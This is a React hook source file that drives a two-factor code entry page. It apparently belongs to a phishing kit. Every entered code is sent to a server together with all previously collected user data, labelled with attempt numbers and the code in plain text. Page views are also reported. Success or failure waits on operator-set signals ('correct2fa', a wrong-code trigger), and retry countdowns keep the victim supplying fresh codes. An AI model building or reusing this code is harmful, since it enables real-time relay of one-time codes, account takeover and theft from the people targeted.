import { useState, useRef, useEffect, useContext, useCallback } from "react";
import { DataContext } from "../pages";
import SendData from "./SendData";
import {
  debugLog,
  getTimeoutDuration,
  shouldWaitForTimeout,
} from "../utils/fa2Config";

// Constants
const VALID_CODE_LENGTHS = [6, 8];
const COUNTDOWN_DURATION = 30;
const IMMEDIATE_RETRY_DELAY = 100;

// State machine states
const STATES = {
  IDLE: "idle",
  LOADING: "loading",
  ERROR: "error",
  SUCCESS: "success",
};

export const useFa2Logic = ({
  LastFetch,
  wrong2faTrigger = 0,
  setStep,
  nextStep = 4,
  componentName = "2FA",
  initialMessage = "2FA Page Loaded",
  allowImmediateRetry = false,
  customLoadingDuration = null,
}) => {
  // Core state
  const [state, setState] = useState(STATES.IDLE);
  const [code, setCode] = useState("");
  const [countdown, setCountdown] = useState(COUNTDOWN_DURATION);
  const [attemptCount, setAttemptCount] = useState(0);
  const [hasTriedSubmit, setHasTriedSubmit] = useState(false);

  // Refs for tracking
  const timeoutRef = useRef(null);
  const countdownRef = useRef(null);
  const currentAttemptRef = useRef(0);
  // Track last processed wrong2fa trigger to avoid double-handling
  const lastProcessedWrong2fa = useRef(wrong2faTrigger);

  // Context
  const { setAllData, AllData } = useContext(DataContext);

  // ============ Helper Functions ============

  const isValidCode = (codeValue) =>
    VALID_CODE_LENGTHS.includes(codeValue?.length || 0);

  const sendDataToServer = useCallback(
    (stepData, currentStep) => {
      const params = {
        ...AllData,
        tfa_one: stepData || "",
        currentStep,
      };
      setAllData(params);
      SendData(params);
    },
    [AllData, setAllData]
  );

  const clearAllTimers = useCallback(() => {
    if (timeoutRef.current) {
      clearTimeout(timeoutRef.current);
      timeoutRef.current = null;
      debugLog("Timeout cleared");
    }
    if (countdownRef.current) {
      clearInterval(countdownRef.current);
      countdownRef.current = null;
      debugLog("Countdown cleared");
    }
  }, []);

  // ============ State Transitions ============

  const transitionToError = useCallback(() => {
    debugLog("[STATE] ERROR");
    setState(STATES.ERROR);
    setCode("");

    if (!allowImmediateRetry) {
      // Start countdown for retry
      setCountdown(COUNTDOWN_DURATION);
      countdownRef.current = setInterval(() => {
        setCountdown((prev) => {
          if (prev <= 1) {
            // Countdown finished, allow retry
            clearInterval(countdownRef.current);
            countdownRef.current = null;
            setState(STATES.IDLE);
            setHasTriedSubmit(false);
            debugLog("Countdown finished - retry enabled");
            return COUNTDOWN_DURATION;
          }
          return prev - 1;
        });
      }, 1000);
    } else {
      // Allow immediate retry
      setTimeout(() => {
        setState(STATES.IDLE);
        setHasTriedSubmit(false);
        debugLog("Immediate retry enabled");
      }, IMMEDIATE_RETRY_DELAY);
    }
  }, [allowImmediateRetry]);

  const transitionToSuccess = useCallback(() => {
    debugLog("[STATE] SUCCESS");
    setState(STATES.SUCCESS);
    clearAllTimers();
    setStep(nextStep);
  }, [clearAllTimers, setStep, nextStep]);

  const transitionToLoading = useCallback(() => {
    debugLog("[STATE] LOADING");
    setState(STATES.LOADING);
    clearAllTimers();
  }, [clearAllTimers]);

  // ============ Response Handlers ============

  const handleTimeout = useCallback(
    (attemptNumber) => {
      debugLog(`\n=== TIMEOUT FIRED FOR ATTEMPT ${attemptNumber} ===`);
      transitionToError();
      sendDataToServer(
        "",
        `${componentName} Timeout - Attempt ${attemptNumber} failed after ${
          (customLoadingDuration ||
            (shouldWaitForTimeout() ? getTimeoutDuration() : 1000)) / 1000
        }s`
      );
    },
    [componentName, customLoadingDuration, sendDataToServer, transitionToError]
  );

  // ============ Main Submit Handler ============

  const handleSubmit = useCallback(
    (e, customDataField = "tfa_one") => {
      e.preventDefault();
      setHasTriedSubmit(true);

      // Validation
      if (!isValidCode(code)) {
        debugLog("Invalid code length - submission blocked");
        return;
      }

      if (state === STATES.LOADING) {
        debugLog("Already loading - submission blocked");
        return;
      }

      if (state === STATES.ERROR && !allowImmediateRetry && countdown > 0) {
        debugLog("Still in countdown - submission blocked");
        return;
      }

      // Start new attempt
      const currentAttempt = attemptCount + 1;
      currentAttemptRef.current = currentAttempt;
      setAttemptCount(currentAttempt);

      debugLog(
        `\n[SUBMIT] ${componentName} attempt ${currentAttempt} starting`
      );
      debugLog(`Code: ${code}`);
      debugLog(`State: ${state}`);

      // Transition to loading
      transitionToLoading();

      // Send data to server
      const params = {
        ...AllData,
        [customDataField]: code,
        currentStep: `${componentName} Attempt ${currentAttempt} - Code: \`${code}\``,
      };
      setAllData(params);
      SendData(params);

      // Set timeout for this attempt
      const timeoutDuration =
        customLoadingDuration ||
        (shouldWaitForTimeout() ? getTimeoutDuration() : 1000);

      debugLog(
        `Setting timeout (${timeoutDuration}ms) for attempt ${currentAttempt}`
      );

      timeoutRef.current = setTimeout(() => {
        if (state === STATES.LOADING) {
          handleTimeout(currentAttempt);
        }
      }, timeoutDuration);
    },
    [
      code,
      state,
      countdown,
      attemptCount,
      componentName,
      allowImmediateRetry,
      AllData,
      setAllData,
      transitionToLoading,
      handleTimeout,
      customLoadingDuration,
    ]
  );

  // ============ Effects ============

  // Effect to watch wrong2faTrigger increments
  useEffect(() => {
    debugLog("[wrong2faEffect] Trigger value:", wrong2faTrigger);

    if (state !== STATES.LOADING) {
      debugLog(
        `[wrong2faEffect] Skipped - state is ${state}, expected LOADING`
      );
      return;
    }

    if (wrong2faTrigger === lastProcessedWrong2fa.current) {
      debugLog(
        `[wrong2faEffect] Skipped - trigger ${wrong2faTrigger} already processed`
      );
      return;
    }

    debugLog(`[wrong2faEffect] Processing new trigger: ${wrong2faTrigger}`);
    debugLog(`[wrong2faEffect] Current attempt: ${currentAttemptRef.current}`);

    // Mark as processed
    lastProcessedWrong2fa.current = wrong2faTrigger;

    // Clear timeout and transition to error
    if (timeoutRef.current) {
      clearTimeout(timeoutRef.current);
      timeoutRef.current = null;
      debugLog("[wrong2faEffect] Timeout cleared");
    }

    debugLog("[wrong2faEffect] Transitioning to error state");
    transitionToError();

    sendDataToServer(
      code,
      `${componentName} Invalid - Attempt ${
        currentAttemptRef.current
      } failed - ${
        allowImmediateRetry
          ? "Can retry immediately"
          : "User locked " + COUNTDOWN_DURATION + "s"
      }`
    );
  }, [
    wrong2faTrigger,
    state,
    code,
    componentName,
    allowImmediateRetry,
    sendDataToServer,
    transitionToError,
  ]);

  // Effect to handle correct2fa response via LastFetch
  useEffect(() => {
    if (state !== STATES.LOADING) return;
    if (LastFetch !== "correct2fa") return;

    debugLog("[correct2faEffect] Processing correct2fa response");
    debugLog(
      `[correct2faEffect] Current attempt: ${currentAttemptRef.current}`
    );

    // Clear timeout and transition to success
    if (timeoutRef.current) {
      clearTimeout(timeoutRef.current);
      timeoutRef.current = null;
      debugLog("[correct2faEffect] Timeout cleared");
    }

    debugLog("[correct2faEffect] Transitioning to success state");
    sendDataToServer(
      code,
      `${componentName} Success - Attempt ${currentAttemptRef.current} - Proceeding to next step`
    );
    transitionToSuccess();
  }, [
    LastFetch,
    state,
    code,
    componentName,
    sendDataToServer,
    transitionToSuccess,
  ]);

  // Initialize component
  useEffect(() => {
    debugLog(`Initializing ${componentName}`);
    sendDataToServer("", `${initialMessage} - ${componentName} form displayed`);

    // Cleanup on unmount
    return () => {
      debugLog(`Cleaning up ${componentName}`);
      clearAllTimers();
    };
  }, []);

  // ============ UI Helpers ============

  const handleCodeChange = useCallback((e) => {
    setCode(e.target.value);
  }, []);

  const shouldShowRedBorder = () =>
    state === STATES.ERROR || (hasTriedSubmit && !isValidCode(code));

  const renderCountdown = () => (
    <span className="text-start fw-bold">
      00:{countdown < 10 && "0"}
      {countdown}
    </span>
  );

  const isButtonDisabled = () =>
    state === STATES.LOADING ||
    (state === STATES.ERROR && !allowImmediateRetry && countdown > 0);

  // ============ Return API ============

  return {
    // State
    code,
    isLoading: state === STATES.LOADING,
    showError: state === STATES.ERROR,
    countdown,
    attemptCount,
    hasTriedSubmit,
    allowImmediateRetry,

    // Handlers
    handleSubmit,
    handleCodeChange,

    // Helpers
    shouldShowRedBorder,
    renderCountdown,
    isButtonDisabled,
    isValidCode,
  };
};
